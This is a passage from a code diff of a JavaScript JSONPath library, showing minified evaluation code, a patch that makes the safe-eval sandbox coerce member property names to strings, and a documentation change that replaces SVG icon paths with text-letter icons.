t===o&&(e=!0);break;case\"integer\":!Number.isFinite(t)||t%1||(e=!0);break;case\"number\":Number.isFinite(t)&&(e=!0);break;case\"nonFinite\":\"number\"!=typeof t||Number.isFinite(t)||(e=!0);break;case\"object\":t&&typeof t===o&&(e=!0);break;case\"array\":Array.isArray(t)&&(e=!0);break;case\"other\":e=this.currOtherTypeCallback(t,r,s,n);break;case\"null\":null===t&&(e=!0);break;default:throw new TypeError(\"Unknown value type \"+o)}if(e)return h={path:r,value:t,parent:s,parentProperty:n},this._handleCallback(h,i,\"value\"),h}else if(\"`\"===l[0]&&t&&Object.hasOwn(t,l.slice(1))){const e=l.slice(1);f(this._trace(u,t[e],c(r,e),t,e,i,o,!0))}else if(l.includes(\",\")){const e=l.split(\",\");for(const o of e)f(this._trace(p(o,u),t,r,s,n,i,!0))}else!a&&t&&Object.hasOwn(t,l)&&f(this._trace(u,t[l],c(r,l),t,l,i,o,!0))}if(this._hasParentSelector)for(let e=0;e<d.length;e++){const r=d[e];if(r&&r.isParentSelector){const a=this._trace(r.expr,t,r.path,s,n,i,o);if(Array.isArray(a)){d[e]=a[0];const t=a.length;for(let r=1;r<t;r++)e++,d.splice(e,0,a[r])}else d[e]=a}}return d},d.prototype._walk=function(e,t){if(Array.isArray(e)){const r=e.length;for(let e=0;e<r;e++)t(e)}else e&&\"object\"==typeof e&&Object.keys(e).forEach((e=>{t(e)}))},d.prototype._slice=function(e,t,r,s,n,i,o){if(!Array.isArray(r))return;const a=r.length,h=e.split(\":\"),l=h[2]&&Number.parseInt(h[2])||1;let c=h[0]&&Number.parseInt(h[0])||0,u=h[1]&&Number.parseInt(h[1])||a;c=c<0?Math.max(0,c+a):Math.min(a,c),u=u<0?Math.max(0,u+a):Math.min(a,u);const d=[];for(let e=c;e<u;e+=l){this._trace(p(e,t),r,s,n,i,o,!0).forEach((e=>{d.push(e)}))}return d},d.prototype._eval=function(e,t,r,s,n,i){this.currSandbox._$_parentProperty=i,this.currSandbox._$_parent=n,this.currSandbox._$_property=r,this.currSandbox._$_root=this.json,this.currSandbox._$_v=t;const o=e.includes(\"@path\");o&&(this.currSandbox._$_path=d.toPathString(s.concat([r])));const a=this.currEval+\"Script:\"+e;if(!d.cache[a]){let t=e.replaceAll(\"@parentProperty\",\"_$_parentProperty\").replaceAll(\"@parent\",\"_$_parent\").replaceAll(\"@property\",\"_$_property\").replaceAll(\"@root\",\"_$_root\").replaceAll(/@([.\\s)[])/gu,\"_$_v$1\");if(o&&(t=t.replaceAll(\"@path\",\"_$_path\")),\"safe\"===this.currEval||!0===this.currEval||void 0===this.currEval)d.cache[a]=new this.safeVm.Script(t);else if(\"native\"===this.currEval)d.cache[a]=new this.vm.Script(t);else if(\"function\"==typeof this.currEval&&this.currEval.prototype&&Object.hasOwn(this.currEval.prototype,\"runInNewContext\")){const e=this.currEval;d.cache[a]=new e(t)}else{if(\"function\"!=typeof this.currEval)throw new TypeError(`Unknown \"eval\" property \"${this.currEval}\"`);d.cache[a]={runInNewContext:e=>this.currEval(t,e)}}}try{return d.cache[a].runInNewContext(this.currSandbox)}catch(t){if(this.ignoreEvalErrors)return!1;throw new Error(\"jsonPath: \"+t.message+\": \"+e)}},d.cache={},d.toPathString=function(e){const t=e,r=t.length;let s=\"$\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=/^[0-9*]+$/u.test(t[e])?\"[\"+t[e]+\"]\":\"['\"+t[e]+\"']\");return s},d.toPointer=function(e){const t=e,r=t.length;let s=\"\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=\"/\"+t[e].toString().replaceAll(\"~\",\"~0\").replaceAll(\"/\",\"~1\"));return s},d.toPathArray=function(e){const{cache:t}=d;if(t[e])return t[e].concat();const r=[],s=e.replaceAll(/@(?:null|boolean|number|string|integer|undefined|nonFinite|scalar|array|object|function|other)\\(\\)/gu,\";$&;\").replaceAll(/[['](\\??\\(.*?\\))[\\]'](?!.\\])/gu,(function(e,t){return\"[#\"+(r.push(t)-1)+\"]\"})).replaceAll(/\\[['\"]([^'\\]]*)['\"]\\]/gu,(function(e,t){return\"['\"+t.replaceAll(\".\",\"%@%\").replaceAll(\"~\",\"%%\n\n@@%%\")+\"']\"})).replaceAll(\"~\",\";~;\").replaceAll(/['\"]?\\.['\"]?(?![^[]*\\])|\\[['\"]?/gu,\";\").replaceAll(\"%@%\",\".\").replaceAll(\"%%@@\n%%\",\"~\").replaceAll(/(?:;)?(\\^+)(?:;)?/gu,(function(e,t){return\";\"+t.split(\"\").join(\";\")+\";\"})).replaceAll(/;;;|;;/gu,\";..;\").replaceAll(/;$|'?\\]|'$/gu,\"\").split(\";\").map((function(e){const t=e.match(/#(\\d+)/u);return t&&t[1]?r[t[1]]:e}));return t[e]=s,t[e].concat()},d.prototype.safeVm={Script:class{constructor(e){this.code=e,this.ast=s(this.code)}runInNewContext(e){const t=Object.assign(Object.create(null),e);return l.evalAst(this.ast,t)}}};d.prototype.vm={Script:class{constructor(e){this.code=e}runInNewContext(e){let t=this.code;const r=Object.keys(e),s=[];!function(e,t,r){const s=e.length;for(let n=0;n<s;n++)r(e[n])&&t.push(e.splice(n--,1)[0])}(r,s,(t=>\"function\"==typeof e[t]));const n=r.map((t=>e[t]));t=s.reduce(((t,r)=>{let s=e[r].toString();return/function/u.test(s)||(s=\"function \"+s),\"var \"+r+\"=\"+s+\";\"+t}),\"\")+t,/(['\"])use strict\\1/u.test(t)||r.includes(\"arguments\")||(t=\"var arguments = undefined;\"+t),t=t.replace(/;\\s*$/u,\"\");const i=t.lastIndexOf(\";\"),o=-1!==i?t.slice(0,i+1)+\" return \"+t.slice(i+1):\" return \"+t;return new Function(...r,o)(...n)}}},e.JSONPath=d}));\n //# sourceMappingURL=index-browser-umd.min.cjs.map\n```\n\nFilename: dist/index-browser-umd.min.cjs.map:\n```\n\n```\n\nFilename: dist/index-node-cjs.cjs:\n```\n@@ -1298,8 +1298,13 @@\nconst SafeEval = {\n     return ast.value;\n   },\n   evalMemberExpression(ast, subs) {\n-    const prop = ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n-    : ast.property.name; // `object.property` property is Identifier\n+    const prop = String(\n+    // NOTE: `String(value)` throws error when\n+    // value has overwritten the toString method to return non-string\n+    // i.e. `value = {toString: () => []}`\n+    ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n+    : ast.property.name // `object.property` property is Identifier\n+    );\n     const obj = SafeEval.evalAst(ast.object, subs);\n     if (obj === undefined || obj === null) {\n       throw TypeError(`Cannot read properties of ${obj} (reading '${prop}')`);\n```\n\nFilename: dist/index-node-esm.js:\n```\n@@ -1296,8 +1296,13 @@\nconst SafeEval = {\n     return ast.value;\n   },\n   evalMemberExpression(ast, subs) {\n-    const prop = ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n-    : ast.property.name; // `object.property` property is Identifier\n+    const prop = String(\n+    // NOTE: `String(value)` throws error when\n+    // value has overwritten the toString method to return non-string\n+    // i.e. `value = {toString: () => []}`\n+    ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n+    : ast.property.name // `object.property` property is Identifier\n+    );\n     const obj = SafeEval.evalAst(ast.object, subs);\n     if (obj === undefined || obj === null) {\n       throw TypeError(`Cannot read properties of ${obj} (reading '${prop}')`);\n```\n\nFilename: docs/ts/assets/icons.js:\n```\n@@ -3,7 +3,7 @@\nfunction addIcons() {\n         if (document.readyState === \"loading\") return document.addEventListener(\"DOMContentLoaded\", addIcons);\n         const svg = document.body.appendChild(document.createElementNS(\"http://www.w3.org/2000/svg\", \"svg\"));\n-        svg.innerHTML = `\"<g id=\"icon-1\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.162 16V7.24H10.578L11.514 10.072C11.602 10.328 11.674 10.584 11.73 10.84C11.794 11.088 11.842 11.28 11.874 11.416C11.906 11.28 11.954 11.088 12.018 10.84C12.082 10.584 12.154 10.324 12.234 10.06L13.122 7.24H14.538V16H13.482V12.82C13.482 12.468 13.49 12.068 13.506 11.62C13.53 11.172 13.558 10.716 13.59 10.252C13.622 9.78 13.654 9.332 13.686 8.908C13.726 8.476 13.762 8.1 13.794 7.78L12.366 12.16H11.334L9.894 7.78C9.934 8.092 9.97 8.456 10.002 8.872C10.042 9.28 10.078 9.716 10.11 10.18C10.142 10.636 10.166 11.092 10.182 11.548C10.206 12.004 10.218 12.428 10.218 12.82V16H9.162Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-2\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.162 16V7.24H10.578L11.514 10.072C11.602 10.328 11.674 10.584 11.73 10.84C11.794 11.088 11.842 11.28 11.874 11.416C11.906 11.28 11.954 11.088 12.018 10.84C12.082 10.584 12.154 10.324 12.234 10.06L13.122 7.24H14.538V16H13.482V12.82C13.482 12.468 13.49 12.068 13.506 11.62C13.53 11.172 13.558 10.716 13.59 10.252C13.622 9.78 13.654 9.332 13.686 8.908C13.726 8.476 13.762 8.1 13.794 7.78L12.366 12.16H11.334L9.894 7.78C9.934 8.092 9.97 8.456 10.002 8.872C10.042 9.28 10.078 9.716 10.11 10.18C10.142 10.636 10.166 11.092 10.182 11.548C10.206 12.004 10.218 12.428 10.218 12.82V16H9.162Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-4\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-namespace)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.33 16V7.24H10.77L13.446 14.74C13.43 14.54 13.41 14.296 13.386 14.008C13.37 13.712 13.354 13.404 13.338 13.084C13.33 12.756 13.326 12.448 13.326 12.16V7.24H14.37V16H12.93L10.266 8.5C10.282 8.692 10.298 8.936 10.314 9.232C10.33 9.52 10.342 9.828 10.35 10.156C10.366 10.476 10.374 10.784 10.374 11.08V16H9.33Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-8\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-enum)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.45 16V7.24H14.49V8.224H10.518V10.936H14.07V11.908H10.518V15.016H14.49V16H9.45Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-16\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-32\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-variable)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.106 16L8.85 7.24H9.966L11.454 13.192C11.558 13.608 11.646 13.996 11.718 14.356C11.79 14.708 11.842 14.976 11.874 15.16C11.906 14.976 11.954 14.708 12.018 14.356C12.09 13.996 12.178 13.608 12.282 13.192L13.758 7.24H14.85L12.582 16H11.106Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-64\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.39 16V7.24H14.55V8.224H10.446V11.128H14.238V12.112H10.47V16H9.39Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-128\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-class)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.898 16.1201C11.098 16.1201 10.466 15.8961 10.002 15.4481C9.53803 15.0001 9.30603 14.3841 9.30603 13.6001V9.64012C9.30603 8.85612 9.53803 8.24012 10.002 7.79212C10.466 7.34412 11.098 7.12012 11.898 7.12012C12.682 7.12012 13.306 7.34812 13.77 7.80412C14.234 8.25212 14.466 8.86412 14.466 9.64012H13.386C13.386 9.14412 13.254 8.76412 12.99 8.50012C12.734 8.22812 12.37 8.09212 11.898 8.09212C11.426 8.09212 11.054 8.22412 10.782 8.48812C10.518 8.75212 10.386 9.13212 10.386 9.62812V13.6001C10.386 14.0961 10.518 14.4801 10.782 14.7521C11.054 15.0161 11.426 15.1481 11.898 15.1481C12.37 15.1481 12.734 15.0161 12.99 14.7521C13.254 14.4801 13.386 14.0961 13.386 13.6001H14.466C14.466 14.3761 14.234 14.9921 13.77 15.4481C13.306 15.8961 12.682 16.1201 11.898 16.1201Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-256\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-interface)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.51 16V15.016H11.298V8.224H9.51V7.24H14.19V8.224H12.402V15.016H14.19V16H9.51Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-512\"><rect fill=\"var(--color-icon-background)\" stroke=\"#4D7FFF\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M11.898 16.1201C11.098 16.1201 10.466 15.8961 10.002 15.4481C9.53803 15.0001 9.30603 14.3841 9.30603 13.6001V9.64012C9.30603 8.85612 9.53803 8.24012 10.002 7.79212C10.466 7.34412 11.098 7.12012 11.898 7.12012C12.682 7.12012 13.306 7.34812 13.77 7.80412C14.234 8.25212 14.466 8.86412 14.466 9.64012H13.386C13.386 9.14412 13.254 8.76412 12.99 8.50012C12.734 8.22812 12.37 8.09212 11.898 8.09212C11.426 8.09212 11.054 8.22412 10.782 8.48812C10.518 8.75212 10.386 9.13212 10.386 9.62812V13.6001C10.386 14.0961 10.518 14.4801 10.782 14.7521C11.054 15.0161 11.426 15.1481 11.898 15.1481C12.37 15.1481 12.734 15.0161 12.99 14.7521C13.254 14.4801 13.386 14.0961 13.386 13.6001H14.466C14.466 14.3761 14.234 14.9921 13.77 15.4481C13.306 15.8961 12.682 16.1201 11.898 16.1201Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-1024\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-2048\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4DB8\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.162 16V7.24H10.578L11.514 10.072C11.602 10.328 11.674 10.584 11.73 10.84C11.794 11.088 11.842 11.28 11.874 11.416C11.906 11.28 11.954 11.088 12.018 10.84C12.082 10.584 12.154 10.324 12.234 10.06L13.122 7.24H14.538V16H13.482V12.82C13.482 12.468 13.49 12.068 13.506 11.62C13.53 11.172 13.558 10.716 13.59 10.252C13.622 9.78 13.654 9.332 13.686 8.908C13.726 8.476 13.762 8.1 13.794 7.78L12.366 12.16H11.334L9.894 7.78C9.934 8.092 9.97 8.456 10.002 8.872C10.042 9.28 10.078 9.716 10.11 10.18C10.142 10.636 10.166 11.092 10.182 11.548C10.206 12.004 10.218 12.428 10.218 12.82V16H9.162Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-4096\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.39 16V7.24H14.55V8.224H10.446V11.128H14.238V12.112H10.47V16H9.39Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-8192\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-16384\"><rect fill=\"var(--color-icon-background)\" stroke=\"#4D7FFF\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M11.898 16.1201C11.098 16.1201 10.466 15.8961 10.002 15.4481C9.53803 15.0001 9.30603 14.3841 9.30603 13.6001V9.64012C9.30603 8.85612 9.53803 8.24012 10.002 7.79212C10.466 7.34412 11.098 7.12012 11.898 7.12012C12.682 7.12012 13.306 7.34812 13.77 7.80412C14.234 8.25212 14.466 8.86412 14.466 9.64012H13.386C13.386 9.14412 13.254 8.76412 12.99 8.50012C12.734 8.22812 12.37 8.09212 11.898 8.09212C11.426 8.09212 11.054 8.22412 10.782 8.48812C10.518 8.75212 10.386 9.13212 10.386 9.62812V13.6001C10.386 14.0961 10.518 14.4801 10.782 14.7521C11.054 15.0161 11.426 15.1481 11.898 15.1481C12.37 15.1481 12.734 15.0161 12.99 14.7521C13.254 14.4801 13.386 14.0961 13.386 13.6001H14.466C14.466 14.3761 14.234 14.9921 13.77 15.4481C13.306 15.8961 12.682 16.1201 11.898 16.1201Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-32768\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-65536\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.31 16V8.224H8.91V7.24H14.79V8.224H12.39V16H11.31Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-131072\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.31 16V8.224H8.91V7.24H14.79V8.224H12.39V16H11.31Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-262144\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D4D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M8.85 16L11.13 7.24H12.582L14.85 16H13.758L13.182 13.672H10.53L9.954 16H8.85ZM10.746 12.76H12.954L12.282 10.06C12.154 9.548 12.054 9.12 11.982 8.776C11.91 8.432 11.866 8.208 11.85 8.104C11.834 8.208 11.79 8.432 11.718 8.776C11.646 9.12 11.546 9.544 11.418 10.048L10.746 12.76Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-524288\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D4D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M8.85 16L11.13 7.24H12.582L14.85 16H13.758L13.182 13.672H10.53L9.954 16H8.85ZM10.746 12.76H12.954L12.282 10.06C12.154 9.548 12.054 9.12 11.982 8.776C11.91 8.432 11.866 8.208 11.85 8.104C11.834 8.208 11.79 8.432 11.718 8.776C11.646 9.12 11.546 9.544 11.418 10.048L10.746 12.76Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-1048576\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D4D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M8.85 16L11.13 7.24H12.582L14.85 16H13.758L13.182 13.672H10.53L9.954 16H8.85ZM10.746 12.76H12.954L12.282 10.06C12.154 9.548 12.054 9.12 11.982 8.776C11.91 8.432 11.866 8.208 11.85 8.104C11.834 8.208 11.79 8.432 11.718 8.776C11.646 9.12 11.546 9.544 11.418 10.048L10.746 12.76Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-2097152\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.31 16V8.224H8.91V7.24H14.79V8.224H12.39V16H11.31Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-4194304\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D82\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M10.354 17V8.24H13.066C13.586 8.24 14.042 8.348 14.434 8.564C14.826 8.772 15.13 9.064 15.346 9.44C15.562 9.816 15.67 10.256 15.67 10.76C15.67 11.352 15.514 11.86 15.202 12.284C14.898 12.708 14.482 13 13.954 13.16L15.79 17H14.518L12.838 13.28H11.434V17H10.354ZM11.434 12.308H13.066C13.514 12.308 13.874 12.168 14.146 11.888C14.418 11.6 14.554 11.224 14.554 10.76C14.554 10.288 14.418 9.912 14.146 9.632C13.874 9.352 13.514 9.212 13.066 9.212H11.434V12.308Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-8388608\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-document)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><g stroke=\"var(--color-text)\" fill=\"var(--color-icon-background)\"><polygon points=\"6,5 6,19 18,19, 18,9 15,5\"></polygon><line x1=\"9\" y1=\"9\" x2=\"14\" y2=\"9\"></line><line x1=\"9\" y1=\"12\" x2=\"15\" y2=\"12\"></line><line x1=\"9\" y1=\"15\" x2=\"15\" y2=\"15\"></line></g></g><g id=\"icon-chevronDown\"><path d=\"M4.93896 8.531L12 15.591L19.061 8.531L16.939 6.409L12 11.349L7.06098 6.409L4.93896 8.531Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-chevronSmall\"><path d=\"M1.5 5.50969L8 11.6609L14.5 5.50969L12.5466 3.66086L8 7.96494L3.45341 3.66086L1.5 5.50969Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-checkbox\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></g><g id=\"icon-menu\"><rect x=\"1\" y=\"3\" width=\"14\" height=\"2\" fill=\"var(--color-text)\"></rect><rect x=\"1\" y=\"7\" width=\"14\" height=\"2\" fill=\"var(--color-text)\"></rect><rect x=\"1\" y=\"11\" width=\"14\" height=\"2\" fill=\"var(--color-text)\"></rect></g><g id=\"icon-search\"><path d=\"M15.7824 13.833L12.6666 10.7177C12.5259 10.5771 12.3353 10.499 12.1353 10.499H11.6259C12.4884 9.39596 13.001 8.00859 13.001 6.49937C13.001 2.90909 10.0914 0 6.50048 0C2.90959 0 0 2.90909 0 6.49937C0 10.0896 2.90959 12.9987 6.50048 12.9987C8.00996 12.9987 9.39756 12.4863 10.5008 11.6239V12.1332C10.5008 12.3332 10.5789 12.5238 10.7195 12.6644L13.8354 15.7797C14.1292 16.0734 14.6042 16.0734 14.8948 15.7797L15.7793 14.8954C16.0731 14.6017 16.0731 14.1267 15.7824 13.833ZM6.50048 10.499C4.29094 10.499 2.50018 8.71165 2.50018 6.49937C2.50018 4.29021 4.28781 2.49976 6.50048 2.49976C8.71001 2.49976 10.5008 4.28708 10.5008 6.49937C10.5008 8.70852 8.71314 10.499 6.50048 10.499Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-anchor\"><g stroke-width=\"2\" stroke=\"currentColor\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path stroke=\"none\" d=\"M0 0h24v24H0z\" fill=\"none\"></path><path d=\"M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5\"></path><path d=\"M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5\"></path></g></g>\"`;\n+        svg.innerHTML = `<g id=\"icon-1\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">M</text></g><g id=\"icon-2\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">M</text></g><g id=\"icon-4\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-namespace)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">N</text></g><g id=\"icon-8\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-enum)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">E</text></g><g id=\"icon-16\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-32\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-variable)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">V</text></g><g id=\"icon-64\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">F</text></g><g id=\"icon-128\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-class)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">C</text></g><g id=\"icon-256\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-interface)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">I</text></g><g id=\"icon-512\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-constructor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" 